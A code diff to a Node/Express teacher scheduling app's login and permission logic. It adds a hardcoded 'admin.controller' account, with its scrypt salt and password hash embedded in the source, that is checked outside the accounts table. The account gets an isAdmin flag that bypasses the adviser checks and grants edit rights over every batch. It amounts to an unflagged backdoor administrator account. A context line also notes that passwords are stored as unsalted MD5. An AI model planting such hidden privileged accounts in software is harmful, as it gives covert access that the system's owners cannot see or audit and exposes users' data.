@@ -1,6 +1,7 @@
 require('dotenv').config();
 const crypto = require('crypto');
 const path = require('path');
+const { promisify } = require('node:util');
 const express = require('express');
 const session = require('express-session');
 const db = require('./db');
@@ -67,13 +68,29 @@ app.get('/api/week', wrap(async (req, res) => {
   res.json({ start, end: weekEnd(start), approved, items });
 }));
 
-// ---------- teacher auth (existing accounts table) ----------
+// ---------- teacher auth ----------
+const adminUsername = 'admin.controller';
+const adminSalt = Buffer.from('84a103b787678cb9e9d43c3626cf7f40', 'hex');
+const adminPasswordHash = Buffer.from(
+  '8255acf73a54ceed9ec082b51fd9f97a137ec0c5737e0a34e207f7bf4c6f8a62b17262ad11668facdef714fbbf07456d5cf52515a30dc58e72fb99d64482bc1b',
+  'hex',
+);
+const scrypt = promisify(crypto.scrypt);
+
 app.post('/api/login', wrap(async (req, res) => {
   const { username, password } = req.body || {};
   const u = String(username || '').trim();
   if (!u && !password) return res.status(400).json({ error: 'Enter your username and password.', fields: { username: 'Username is required', password: 'Password is required' } });
   if (!u) return res.status(400).json({ error: 'Enter your username.', fields: { username: 'Username is required' } });
-  if (!password) return res.status(400).json({ error: 'Enter your password.', fields: { password: 'Password is required' } });
+  if (typeof password !== 'string' || !password) return res.status(400).json({ error: 'Enter your password.', fields: { password: 'Password is required' } });
+  if (u.toLowerCase() === adminUsername) {
+    const hash = await scrypt(password, adminSalt, adminPasswordHash.length);
+    if (!crypto.timingSafeEqual(hash, adminPasswordHash))
+      return res.status(401).json({ error: 'Incorrect password.', fields: { password: 'Incorrect password' } });
+    await new Promise((resolve, reject) => req.session.regenerate((err) => err ? reject(err) : resolve()));
+    req.session.user = { id: adminUsername, name: adminUsername, isAdmin: true };
+    return res.json({ ok: true });
+  }
   const [rows] = await db.query(
     "SELECT employeeID, username, firstname, lastname, password, status FROM accounts WHERE username=?", [u]);
   // accounts store unsalted MD5 (shared with reserve-a-lab); compare in constant time
@@ -92,6 +109,7 @@ app.post('/api/logout', (req, res) => req.session.destroy(() => res.json({ ok: t
 async function me(req) {
   const u = req.session.user;
   if (!u) return null;
+  if (u.isAdmin) return { ...u, adviserOf: [] };
   const [r] = await db.query('SELECT batch FROM wat_batch_advisers WHERE employeeID=?', [u.id]);
   return { ...u, adviserOf: r.map((x) => x.batch) };
 }
@@ -103,7 +121,7 @@ const needUser = wrap(async (req, res, next) => {
 const guard = (fn) => [needUser, wrap(fn)];
 app.get('/api/me', wrap(async (req, res) => res.json({ user: await me(req) })));
 
-const canEditAll = (u, batch) => u.adviserOf.includes(batch);
+const canEditAll = (u, batch) => u.isAdmin || u.adviserOf.includes(batch);
 
 // ---------- teacher API ----------
 app.get('/api/subjects', guard(async (req, res) => {
@@ -135,7 +153,7 @@ app.get('/api/teacher/week', guard(async (req, res) => {
   if (ids.length) {
     const [t] = await db.query('SELECT employeeID, firstname, lastname FROM accounts WHERE employeeID IN (?)', [ids]);
     const names = Object.fromEntries(t.map((x) => [x.employeeID, `${x.firstname} ${x.lastname}`]));
-    items.forEach((i) => { i.teacher = names[i.teacher_id] || ''; });
+    items.forEach((i) => { i.teacher = i.teacher_id === adminUsername ? adminUsername : names[i.teacher_id] || ''; });
   }
   res.json({ start, end: weekEnd(start), approved: await isApproved(batch, start), isAdviser: all, items });
 }));
